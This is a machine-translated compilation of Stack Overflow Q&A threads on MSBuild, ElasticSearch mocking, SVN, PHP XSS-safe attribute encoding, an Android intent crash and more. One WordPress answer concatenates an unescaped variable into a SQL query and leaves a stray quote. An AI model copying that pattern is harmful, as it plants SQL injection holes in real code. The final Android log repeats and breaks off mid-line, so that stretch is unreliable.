我会返回发布构建步骤但使用`xcopy /d`（仅在较新的情况下复制），并使用这样的步骤[如何在 Visual Studio 2008 中创建自定义清理（清理后）事件？](https://stackoverflow.com/q/631636/30225)实施自定义清洁。

您可以通过在每种情况下获取列表并在它们上执行来避免重复的文件列表。

预构建事件只是批处理脚本

并且您可以使用 MSBUILD 批处理来创建清理步骤适用的列表。

如果您愿意，您可以在 msbuild 脚本中编写一个编译前步骤，将文件从源复制到目标，而不是 VS 中的预编译步骤。

# ruby-on-rails - ElasticSearch + Tire：模拟 ES 的好策略

> ID：10403951
> 
> 赞同：9
> 
> 时间：2012-05-01T20:32:20.157
> 
> 标签：ruby-on-rails, ruby-on-rails-3, rspec, elasticsearch, tire

我在我的网站主页上使用 ElasticSearch。在我的验收测试中，当用户登录时，他会被重定向到主页。

但是在测试中使用 ES 很昂贵（需要创建和删除索引），所以我不想每次用户浏览主页时都必须这样做。

我只想在测试有一些元数据时才进行实际的 ES 搜索：

```
config.before(:each) do
    if example.metadata[:elastic]
        Model.create_elasticsearch_index
    end
end

scenario "Results should be ordered by distance", :elastic do
    # tests...
end 
```

因此，当测试没有 :elastic 元数据时，我需要“模拟”搜索而不使用 ES。

什么是实现这一目标的好方法？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-05-02T04:06:01.023

我可能会使用[FakeWeb](http://fakeweb.rubyforge.org/)选择性地启用和禁用实时 HTTP 调用。

模拟对 ES 的调用：

```
FakeWeb.allow_net_connect = false
FakeWeb.register_uri(:any, %r|\Ahttp://localhost:9200|, :body => "{}") 
```

允许调用 ES：

```
FakeWeb.clean_registry
FakeWeb.allow_net_connect = true 
```

这里并不严格要求允许和禁止网络连接，因为 FakeWeb 的模拟比实际调用优先，但我发现当某些东西进行未模拟的 HTTP 调用时，它有助于在测试中抛出异常。

您可能可以对此进行扩展，以根据需要使用测试元数据来启用或禁用模拟。

# svn - SVN 系列产品版本控制

> ID：10403953
> 
> 赞同：0
> 
> 时间：2012-05-01T20:32:44.203
> 
> 标签：svn

我们正在建立一个产品系列。该系列中的每个产品都建立在通用的“基础设施”组件之上。因此，我们有不同的应用程序团队，他们致力于产品 A、产品 B 和 f 系列中的基础设施组件。

通常，产品 A、B..X 和基础设施将有自己的发布周期，彼此独立。所以我们的版本控制策略是 2 折。产品/基础设施独立版本化，然后部署的系列版本化。

并非所有产品都会同时创建。因此，很少有示例部署是：-

Family1.0 [infrastructure-1.0，产品 A-1.0]

Family1.0.1 [infrastructure-1.0，产品 A-1.1]

Family1.2 [infrastructure-1.1，产品 A-2.0]

Family2.0 [infrastructure-1.2，产品 A-2.0，产品 B-1.0]

因此，我创建了一个 SVN 目录结构，例如

```
family
    /tags
/product A
    /tags
    /trunk
/product B
    /tags
    /trunk
/infrastructure
    /tags
    /trunk 
```

我的问题是我怎样才能使以下成为可能

```
/family
    /tags
        /tag1.0 <-- should refer to infrastructure tag 1.0 and product A tag1.0
/product A
    /tags
        /tag1.0
/infrastructure
    /tags
        /tag1.0 
```

因此，family tag1.0 应指产品 A tag 1.0 和基础设施 tag1.0。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T20:38:54.030

您应该能够使用 svn:externals 属性（[此处](http://svnbook.red-bean.com/en/1.0/ch07s03.html)），但不是链接到其他存储库，而是指定您的存储库。

所以产品 A 会有一个外部设置为[http://myrepourl.com/infrastructure/tags/tag1.0](http://myrepourl.com/infrastructure/tags/tag1.0)

然后产品可以将外部设置为[http://myrepourl.com/infrastructure/tags/tag1.1](http://myrepourl.com/infrastructure/tags/tag1.1)。

这是我认为完成多个依赖项的唯一方法，除非它以某种方式在您的配置文件中（或检查正确基础结构的版本化脚本）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:39:12.667

如果您想要所有项目的快照，则将根分支到标签文件夹

你来自：

```
/tags
/trunk
    /family           
    /product_A
    /product_B
    /infrastructure 
```

至

```
/tags
    /tag1.0               ; Snapshot of trunk with all the projects
        /family           
        /product_A
        /product_B
        /infrastructure
/trunk
    /family           
    /product_A
    /product_B
    /infrastructure 
```

# jsf-2 - 星级 Primefaces 始终为零

> ID：10403957
> 
> 赞同：0
> 
> 时间：2012-05-01T20:33:03.360
> 
> 标签：jsf-2, primefaces, rating

我对 Primefaces 3.2 的评分有疑问。
我在我的 JSF 项目中使用它，但它始终设置为零利率。
为什么 ？我该如何解决这个问题？这是我的代码 XHTML 页面：

```
<p:rating value="#{mybean.rating}">  
  <p:ajax event="rate" listener="#{mybean.onrate}" update="messages,spanResult"  /> 
</p:rating> 
```

这是我的 bean 代码：

```
@ManagedBean(name="mybean")
@SessionScoped
public class MyBean implements Serializable{
  public void onrate(RateEvent rateEvent){
    FacesMessage message1 = new FacesMessage(FacesMessage.SEVERITY_INFO, "Rate Event", "You rated:" + ((Double) rateEvent.getRating()).intValue());  
    FacesContext.getCurrentInstance().addMessage(null, message1);
    ....
   }

   private double rating; 

   public double getRating() {  
       return rating;  
   }  

   public void setRating(double rating) {
       this.rating = rating;  
   }  

   ...
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-02T10:06:07.200

我解决了。
我需要在里面插入 xhtml 代码`<h:form>`。

# javascript - 在 nodejs 中包含简单的 javascript

> ID：10403962
> 
> 赞同：1
> 
> 时间：2012-05-01T20:33:19.193
> 
> 标签：javascript, node.js

我对 Node.js 很陌生，我通过了一个教程并设置了自己的服务器，该服务器使用基本的 html 响应一些请求。

```
var body = '<html>'+
            '<head>'+
            '<meta http-equiv="Content-Type" content="text/html; '+
            'charset=UTF-8">'+

            '</head>'+
            '<body>'+
            '<form action="/upload" method="post">'+
            '<textarea name="text" rows="20" cols="60"></textarea>'+
            '<input type="submit" value="Submit text">'+
            '</form>'+
            '</body>'+
            '</html>';

response.writeHead(200, {"Content-Type": "text/html"}); 
response.write(body); 
```

我从以前的项目（基本 html 和 JS）中获得了一个基本上绘制表格（日历）的 javascript 函数。

但是我将如何在 Node.js 中使用它？我真的不明白我应该如何建立网站？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-01T20:39:20.810

您之前的代码可能依赖于在 Web 浏览器中访问 DOM。这在服务器端不可用。因此，您通常不能只在服务器端 js 环境中使用为客户端环境编写的代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-01T20:44:06.573

您可以查看一个允许服务器端 DOM 操作的库。请参阅： [http ://blog.marksoper.net/Server-side-DOM-manipulation-in-Nodejs-with-JSDOM-JQuery-and-Mustache-Templates-April-25-2011.html](http://blog.marksoper.net/Server-side-DOM-manipulation-in-Nodejs-with-JSDOM-JQuery-and-Mustache-Templates-April-25-2011.html)

如果你不想在你的服务器代码中编写 HTML，我强烈推荐 Express.js 在我的大学最后一年的项目中使用了一年。 [http://expressjs.com/](http://expressjs.com/)

请注意，Express 通常希望您为您的网页使用模板语言，例如[http://jade-lang.com/](http://jade-lang.com/)。但是，您不需要使用模板语言。（但它们确实提供了一些不错的功能，例如将 JSON 传递到模板中）

# wordpress - 如何使用 WP_Query 按 post_excerpt 过滤

> ID：10403965
> 
> 赞同：2
> 
> 时间：2012-05-01T20:33:42.933
> 
> 标签：wordpress

```
$loop = new WP_Query( array(
    'post_type' => 'portfolio',
    'paged' => $paged,
    'posts' => array(
        'post_excerpt' => 'ba'
    )
)); 
```

这不适合我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2018-02-04T17:53:08.287

我试过这个解决方案：

```
global $wpdb;
$querystr = "SELECT * FROM $wpdb->posts WHERE $wpdb->posts.post_excerpt = {$code}' AND $wpdb->posts.post_type = 'product'";     
$posts = $wpdb->get_results($querystr); 
```

# java - Jersey - JsonFormatException - JAXB - GET 返回正常 - PUT 解析抛出错误

> ID：10403974
> 
> 赞同：2
> 
> 时间：2012-05-01T20:34:50.780
> 
> 标签：java, jaxb, intellij-idea, jersey

好的，所以我在这里有一个小问题。

我有以下用 JAXB 注释的类： [https://github.com/gaborbernat/fs_viewer/blob/master/fs_data/src/net.primerranks.fs_data/User.java](https://github.com/gaborbernat/fs_viewer/blob/master/fs_data/src/net.primeranks.fs_data/User.java)

然后我有一个泽西岛资源来处理 GET/PUT 的东西： [https ://github.com/gaborbernat/fs_viewer/blob/master/fs_primerranks_server/src/net/primerranks/fs_server/ResourceUser.java](https://github.com/gaborbernat/fs_viewer/blob/master/fs_primeranks_server/src/net/primeranks/fs_server/ResourceUser.java)

现在我的问题是 GET 部分效果很好。例如，一个有效的 GET 输出可能是这样的：[https ://github.com/gaborbernat/fs_viewer/blob/master/fs_primerranks_server/rsc/json_2_yet_sas.txt](https://github.com/gaborbernat/fs_viewer/blob/master/fs_primeranks_server/rsc/json_2_yet_sas.txt)

但是，如果我指定与 PUT 参数相同的文本，则会出现错误。这是我的请求（使用 IntelliJ）。![我将文本文件作为 PUT 内容传回。][1]

我在应用服务器上打开了详细日志记录，这样我就可以看到发生了什么。结果如下：

```
 May 1, 2012 8:03:45 PM com.sun.jersey.spi.container.ContainerResponse logException
    FINE: Mapped exception to response: 400 (Bad Request)
    javax.ws.rs.WebApplicationException: com.sun.jersey.json.impl.reader.JsonFormatException: Unexpected character: - (line: 1, column: 1)
        at com.sun.jersey.json.impl.provider.entity.JSONJAXBElementProvider.readFrom(JSONJAXBElementProvider.java:128)
...
Caused by: com.sun.jersey.json.impl.reader.JsonFormatException: Unexpected character: - (line: 1, column: 1)
    at com.sun.jersey.json.impl.reader.JsonLexer.yylex(JsonLexer.java:662)
    at com.sun.jersey.json.impl.reader.JsonXmlStreamReader.nextToken(JsonXmlStreamReader.java:160)
    at com.sun.jersey.json.impl.reader.JsonXmlStreamReader.readNext(JsonXmlStreamReader.java:187)
    at com.sun.jersey.json.impl.reader.JsonXmlStreamReader.readNext(JsonXmlStreamReader.java:178) 
```

[1]：http: [//i.stack.imgur.com/CmCiE.png](http://i.stack.imgur.com/CmCiE.png)`enter code here`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-04T18:23:42.687

似乎 IntelliJ Idea 将上传文件本身而不是其内容。使用 Firefox restclient 扩展进行了尝试，似乎工作得很好。

# ios - UrbanAirship 的 iOS 推送通知错误

> ID：10403978
> 
> 赞同：1
> 
> 时间：2012-05-01T20:35:46.417
> 
> 标签：ios, push-notification, urbanairship.com

我终于得到了 UrbanAirship 的推送通知。但是现在我有一个问题，在这里搜索并找不到解决方案。

当应用程序正在运行并且我收到通知时，单击通知会将我带入应用程序，一切都很好。

当我杀死应用程序并收到通知时，应用程序会因 SIGKILL 而死。

这是日志：[日志](http://pastebin.com/yRuBbZx8)

好的，这是我的 appdelegate.m：

```
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{
//Init Airship launch options
NSLog(@"Before NSMutableDictionary");
NSMutableDictionary *takeOffOptions = [[NSMutableDictionary alloc] init];
[takeOffOptions setValue:launchOptions forKey:UAirshipTakeOffOptionsLaunchOptionsKey];

// Create Airship singleton that's used to talk to Urban Airship servers.
// Please populate AirshipConfig.plist with your info from http://go.urbanairship.com
NSLog(@"Before takeOff");
[UAirship takeOff:takeOffOptions];

// Register for notifications
NSLog(@"Before UIApplication");
[[UIApplication sharedApplication]
 registerForRemoteNotificationTypes:(UIRemoteNotificationTypeBadge |
                                     UIRemoteNotificationTypeSound |
                                     UIRemoteNotificationTypeAlert)];

NSLog(@"Before reset badge");
//reset badge
application.applicationIconBadgeNumber = 0;

self.window = [[UIWindow alloc] initWithFrame:[[UIScreen mainScreen] bounds]];
// Override point for customization after application launch.

self.viewController = [[ViewController alloc] initWithNibName:@"ViewController" bundle:nil];
self.window.rootViewController = self.viewController;

[self.window makeKeyAndVisible];

return YES;
}

-(void)application:(UIApplication *)application didRegisterForRemoteNotificationsWithDeviceToken:(NSData *)deviceToken
{
NSLog(@"didRegisterForRemoteNotifications");
[[UAirship shared] registerDeviceToken:deviceToken];
}

-(void)application:(UIApplication *)application didFailToRegisterForRemoteNotificationsWithError:(NSError *)error
{
NSString *str = [NSString stringWithFormat: @"Error: %@", error];
NSLog(@"Error:%@",str); 
} 
```

在此 Mac Mini 通过窗口之前，非常感谢您提供的任何帮助 :-)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-01T21:34:16.907

我认为这与 Urban Airship 无关。如果你：

1.  创建一个全新的项目
2.  插入您的设备
3.  运行应用程序
4.  从手机强制关闭应用程序（您可能必须尝试重新打开它）

您将收到相同的错误消息。

由于它发生在一个全新的项目中，甚至没有触及它，我认为这种行为是预期的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-29T05:24:24.900

你确实提到了...

> 当我杀死应用程序并收到通知时，应用程序会因 SIGKILL 而死。

我会检查你的 applicationDidBecomeActive:(UIApplication *)application 方法。苹果文档说...

调用此方法是为了让您的应用程序知道它已从非活动状态变为活动状态。这可能是因为您的应用程序是由用户或系统启动的。如果用户选择忽略将应用程序暂时发送到非活动状态的中断（例如来电或短信），应用程序也可以返回到活动状态。

您应该使用此方法重新启动应用程序处于非活动状态时暂停（或尚未启动）的所有任务。例如，您可以使用它来重新启动计时器或提高 OpenGL ES 帧速率。如果您的应用以前在后台，您还可以使用它来刷新应用的用户界面。

# ios - 为什么这个演员不需要ARC下的桥接？

> ID：10403980
> 
> 赞同：5
> 
> 时间：2012-05-01T20:36:03.223
> 
> 标签：ios, automatic-ref-counting

为什么将 CGImageRef 转换为对象指针不需要内存管理信息（__bridge 等）？例如，如果*image*是 UIImage * 类型，并且*layer*是 UIView 的底层，那么下面的代码行不会引起编译器的任何抱怨：

```
layer.content = (id)[image CGImage]; 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-01T21:18:04.743

引用[过渡到 ARC 发行说明](http://developer.apple.com/library/ios/#releasenotes/ObjectiveC/RN-TransitioningToARC/Introduction/Introduction.html)：

> 编译器处理从 Cocoa 方法返回的 CF 对象
> 
> 编译器理解返回 Core Foundation 类型的 Objective-C 方法遵循历史 Cocoa 命名约定（[请参阅高级内存管理编程指南](http://developer.apple.com/library/ios/#documentation/Cocoa/Conceptual/MemoryMgmt/Articles/MemoryMgmt.html#//apple_ref/doc/uid/10000011i)）。例如，编译器知道，在 iOS 中，由 UIColor 的 CGColor 方法返回的 CGColor 是不拥有的。您仍然必须使用适当的类型转换，如本示例所示...

（好吧，不是很可可，但是嘿！）。

因为 CGImage 返回一个 CoreFoundation 对象，所以不需要强制转换`__bridge`。

# jquery - 跨浏览器图像加载事件处理

> ID：10403983
> 
> 赞同：3
> 
> 时间：2012-05-01T20:36:09.817
> 
> 标签：jquery

在加载事件[http://api.jquery.com/load-event/](http://api.jquery.com/load-event/)的 jQuery 文档中，它说 `Can cease to fire for images that already live in the browser's cache`。是否有更多信息可用，例如它会影响哪些浏览器，以及在什么情况下？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-05-01T20:39:12.990

我不确定哪些浏览器会受到影响，但很容易检查。

```
var img = new Image();
img.src = "foo.jpg";
if (img.complete || img.readyState === 4) {
    // image is cached
    doneCallback();
}
else {
    $(img).on('load',doneCallback);
} 
```

**更新**

如果您更改代码，它将始终在所有浏览器中触发加载事件。

```
var img = new Image();
$(img).load(doneCallback);
img.src = "foo.jpg"; 
```

# php - PHP：HTML 属性编码 / JavaScript 解码

> ID：10403985
> 
> 赞同：7
> 
> 时间：2012-05-01T20:36:14.407
> 
> 标签：php, javascript, html, xss, html-entities

为 HTML 属性上下文编码不受信任的数据的正确方法是什么？例如：

```
<input type="hidden" value="<?php echo $data; ?>" /> 
```

我通常使用`htmlentities()`或`htmlspecialchars()`这样做：

```
<input type="hidden" value="<?php echo htmlentities($data); ?>" /> 
```

但是，我最近遇到了一个问题，当我需要传递的数据是一个需要传递给 JavaScript 以更改页面位置的 URL 时，这会破坏我的应用程序：

```
<input id="foo" type="hidden" value="foo?bar=1&amp;baz=2" />
<script>
    // ...
    window.location = document.getElementById('foo').value;
    // ...
</script> 
```

在这种情况下，`foo`是一个 C 程序，它不理解 URL 中的编码字符和段错误。

我可以简单地在 JavaScript 中获取值并执行类似的操作`value.replace('&amp;', '&')`，但这看起来很笨拙，并且仅适用于 & 符号。

所以，我的问题是：有没有更好的方法来编码或解码注入 HTML 属性的数据？

我已经阅读了所有[OWASP 的 XSS 预防备忘单](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet)，在我看来，只要我小心地引用我的属性，那么我需要编码的唯一字符就是引用本身 ( `"`) - 在这种情况下，我可以使用类似的东西`str_replace('"', '&quot;', ...)`- 但是，我不确定我是否正确理解它。

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-10T21:31:07.013

您当前的使用方法`htmlentities()`or`htmlspecialchars()`是正确的方法。

您提供的示例是正确的 HTML：

```
<input id="foo" type="hidden" value="foo?bar=1&amp;baz=2" /> 
```

value 属性中的 & 确实需要进行 HTML 编码，否则您的 HTML 无效。大多数浏览器都会`&`在其中正确解析它，但这并不会改变它无效的事实，并且您正确地对其进行编码。

您的问题不在于值的编码，这很好，而在于您使用的 Javascript 代码无法正确解码。

事实上，我对此感到惊讶，因为您的 JS 代码正在访问 DOM，而 DOM 应该返回解码后的值。

我写了一个 JSfiddle 来向自己证明这一点：http: [//jsfiddle.net/qRd4Z/](http://jsfiddle.net/qRd4Z/)

运行它，它会给我一个警报框，其中包含我预期的解码值。将其更改为`console.log`也给出我期望的结果。所以我不确定为什么你会得到不同的结果？也许您使用的是不同的浏览器？可能值得指定您正在测试哪个。或者您可能错误地对实体进行了双重编码？你能确认不是这样吗？

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-07-10T21:26:52.680

> 为 HTML 属性上下文编码不受信任的数据的正确方法是什么？

如果在属性值周围添加双引号，则 htmlspecialchars() 就足够了。

> ```
>  <input id="foo" type="hidden" value="foo?bar=1&amp;baz=2" /> 
> ```

这是正确的，浏览器将发送`foo?bar=1&baz=2`（解码`&amp;`）到服务器。如果服务器没有看到`foo?bar=1&baz=2`，则您必须对该值进行了两次编码。

在 javascript 中获取值`foo?bar=1&baz=2`也应该返回（例如`document.getElementById('foo').value`必须返回`foo?bar=1&baz=2`）。

使用浏览器查看页面的源代码并查看输入字段的实际源代码。

如果您使用 Javascript 修改输入字段的值，则脚本必须对其进行双重编码。

顺便说一句，您的程序不应该因为错误的用户输入而出现段错误；）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-10T21:25:20.783

您可以使用 DOM 来解码值：

```
function decodeHTMLSpecialChars(input){
  var div = document.createElement('div');
  div.innerHTML = input;
  return div.childNodes.length === 0 ? "" : div.childNodes[0].nodeValue;
} 
```

这将呈现以下字符串：

```
'http://someurl.com/foo?bar=1&amp;baz=2' 
```

对此：

```
decodeHTMLSpecialChars('http://someurl.com/foo?bar=1&amp;baz=2');
// => 'http://someurl.com/foo?bar=1&baz=2 
```

不，对于 HTML 编码和解码，[`htmlspecialchars`](http://www.php.net/manual/en/function.htmlspecialchars.php)和 html 转义是标准方法，并且对您来说做得很好。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-03-24T00:27:49.067

请注意，`htmlentities`按原样使用没有帮助！

默认情况下它只是编码`" < > &`

它不会逃脱`'`，这会造成问题！

确保对函数使用标志，您可以在[此处找到用法和示例](http://php.net/manual/en/function.htmlentities.php)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-07-11T02:42:52.107

你能不能只使用`html_entity_decode`PHPJS 中的函数：

[http://phpjs.org/functions/html_entity_decode](http://phpjs.org/functions/html_entity_decode)

除此之外，您可以使用 base64 对您的数据进行编码...

# android - 如何使用 i.putExtra 将文本从 screen1 发送到 screen2？

> ID：10403987
> 
> 赞同：0
> 
> 时间：2012-05-01T20:36:22.693
> 
> 标签：android, class, button, android-intent

我正在写一本食谱书，我遇到了一个问题 - 我想将我的食谱列表中的文本发送到食谱显示屏幕，我一定是做错了什么，因为我一直在强制关闭：

这是我的 Recipe_Button_List 的代码

公共类 Recipe_Button_List 扩展 Activity {

EditText输入法；

EditText 输入成分；

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.recipe_button_list);

    inputMethod = (EditText) findViewById(R.id.textView2);
    inputIngredients = (EditText) findViewById(R.id.textView1);

    ActionBar actionBar = getActionBar();
    actionBar.setDisplayHomeAsUpEnabled(true);

    Button mainNext = (Button) findViewById(R.id.Recipe1);
    mainNext.setOnClickListener(new OnClickListener() {
        public void onClick(View v) {
            final TextView mTextView = (TextView) findViewById(R.id.textView1);
            mTextView.setText(R.string.Test);
            Intent i= new Intent(getBaseContext(),recipedisplayscreen.class);
            //Sending data to the next screen
            i.putExtra("textView1", inputIngredients.getText().toString());
            i.putExtra("textView2", inputMethod.getText().toString());

            Log.e("n", inputMethod.getText()+"."+ inputIngredients.getText());

            startActivity(i);
        }
    });
}
 @Override
 public boolean onCreateOptionsMenu(Menu menu) {
     MenuInflater inflater = getMenuInflater();
     inflater.inflate(R.menu.recipe_menu1, menu);
     return true;

} 
```

}

这是我的 recipe_display_screen：

公共类 recipedisplayscreen 扩展 Activity {

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.recipedisplayscreen);

    TextView MethodDisplay = (TextView) findViewById(R.id.textView2);
    TextView IngredientsDisplay = (TextView) findViewById(R.id.textView4);

    Intent i = getIntent();
    String Ingredients = i.getStringExtra("TextView1");
    String Method = i.getStringExtra("TextView2");
    Log.e("recipedisplayscreen", Ingredients + "." + Method);

    MethodDisplay.setText(Method);
    IngredientsDisplay.setText(Ingredients);

    ActionBar actionBar = getActionBar();
    setTitle(R.string.title);
    actionBar.setDisplayHomeAsUpEnabled(true);}

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case android.R.id.home:
                // App icon in action bar clicked; go home
                Intent intent = new Intent(this, MainScreen.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(intent);
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

 @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.recipe_menu1, menu);
        return true;

} 
```

}

以下是来自 logCat 的记录：

05-01 21:54:54.638: D/AndroidRuntime(10717): 关闭 VM 05-01 21:54:54.638: W/dalvikvm(10717): threadid=1: 线程退出未捕获异常 (group=0x40a301f8) 05 -01 21:54:54.638: E/AndroidRuntime(10717): 致命异常: main 05-01 21:54:54.638: E/AndroidRuntime(10717): java.lang.RuntimeException: 无法启动活动 ComponentInfo{com.bluStudios .Recipes4U.ics/com.bluStudios.Recipes4U.ics.Recipe_Button_List}：java.lang.ClassCastException：android.widget.TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638：E/AndroidRuntime(10717 ): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1956) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:1981) 05- 01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread。访问$600(ActivityThread.java:123) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread$H.handleMessage(ActivityThread.java:1147) 05-01 21:54:54.638 : E/AndroidRuntime(10717): 在 android.os.Handler.dispatchMessage(Handler.java:99) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.os.Looper.loop(Looper. java:137) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.main(ActivityThread.java:4424) 05-01 21:54:54.638: E/AndroidRuntime(10717) : 在 java.lang.reflect.Method.invokeNative(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 java.lang.reflect.Method.invoke(Method.java:511) 05- 01 21:54:54.638: E/AndroidRuntime(10717): 在 com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784) 05-01 21:54:54.638: E/AndroidRuntime(10717) : 在 com.android。internal.os.ZygoteInit.main(ZygoteInit.java:551) 05-01 21:54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638 : E/AndroidRuntime(10717): 引起: java.lang.ClassCastException: android.widget.TextView 不能转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com. bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread .performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多os.ZygoteInit.main(ZygoteInit.java:551) 05-01 21:54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E /AndroidRuntime(10717): 引起: java.lang.ClassCastException: android.widget.TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios。 Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21: 54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity (ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多os.ZygoteInit.main(ZygoteInit.java:551) 05-01 21:54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E /AndroidRuntime(10717): 引起: java.lang.ClassCastException: android.widget.TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios。 Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21: 54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity (ActivityThread.java:1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多main(ZygoteInit.java:551) 05-01 21:54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717) ): 引起: java.lang.ClassCastException: android.widget.TextView 不能转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics。 Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java :1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多main(ZygoteInit.java:551) 05-01 21:54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717) ): 引起: java.lang.ClassCastException: android.widget.TextView 不能转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics。 Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java :1920) 05-01 21:54:54.638: E/AndroidRuntime(10717): ... 11 更多54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717): Caused by: java.lang.ClassCastException: android. widget.TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation .callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 21:54:54.638: E /AndroidRuntime(10717): ... 11 更多54:54.638: E/AndroidRuntime(10717): at dalvik.system.NativeStart.main(Native Method) 05-01 21:54:54.638: E/AndroidRuntime(10717): Caused by: java.lang.ClassCastException: android. widget.TextView 无法转换为 android.widget.EditText 05-01 21:54:54.638: E/AndroidRuntime(10717): at com.bluStudios.Recipes4U.ics.Recipe_Button_List.onCreate(Recipe_Button_List.java:25) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Activity.performCreate(Activity.java:4465) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.Instrumentation .callActivityOnCreate(Instrumentation.java:1049) 05-01 21:54:54.638: E/AndroidRuntime(10717): 在 android.app.ActivityThread.performLaunchActivity(ActivityThread.java:1920) 05-01 